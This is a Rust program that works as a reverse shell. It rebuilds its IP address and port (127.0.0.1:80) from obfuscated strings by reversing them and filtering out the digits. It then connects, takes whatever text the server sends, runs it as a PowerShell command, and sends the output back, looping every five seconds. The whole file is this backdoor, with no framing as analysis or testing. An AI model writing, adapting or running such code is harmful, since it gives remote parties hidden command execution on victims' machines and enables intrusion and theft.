use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::str::from_utf8;
use std::{thread, time};

fn main() {
    loop {
        println!("a");
        let IP1: String = "JMXee7jzqUJLFN2tpEMSHw1mDpc"
            .chars()
            .rev()
            .filter(|c| c.is_digit(10))
            .collect();
        let IP2: String = "bvvY0SQGb"
            .chars()
            .rev()
            .filter(|c| c.is_digit(10))
            .collect();
        let IP3: String = "YtAbN0ItcuM"
            .chars()
            .rev()
            .filter(|c| c.is_digit(10))
            .collect();
        let IP4: String = "ioW1ILX".chars().rev().filter(|c| c.is_digit(10)).collect();
        let _Port: String = "PWAA0sCTRdkX8wff"
            .chars()
            .rev()
            .filter(|c| c.is_digit(10))
            .collect();
        match TcpStream::connect(
            [
                IP1,
                ".".to_string(),
                IP2,
                ".".to_string(),
                IP3,
                ".".to_string(),
                IP4,
                ":".to_string(),
                _Port,
            ]
            .join(""),
        ) {
            Ok(mut stream) => {
                println!("Successfully connected to server in port 80");
                // stream.write(msg).unwrap();
                let mut data = [0; 1024]; // using 6 byte buffer
                match stream.read(&mut data) {
                    Ok(_) => {
                        let text = from_utf8(&data).unwrap();
                        let text = text.trim_matches(char::from(0));
                        println!("{}", text);
                        let output = Command::new("powershell")
                            .args([text])
                            .stdout(Stdio::piped())
                            .output()
                            .expect("failed to execute process");
                        stream.write(&output.stdout).unwrap();
                        // println!("{}", output.stdout.len());
                        println!("Reply: {:?}", String::from_utf8_lossy(&output.stdout));
                    }
                    Err(e) => {
                        println!("Failed to receive data: {}", e);
                    }
                }
            }
            Err(e) => {
                println!("Failed to connect: {}", e);
            }
        }
        println!("Terminated.");
        thread::sleep(time::Duration::from_secs(5));
    }
}
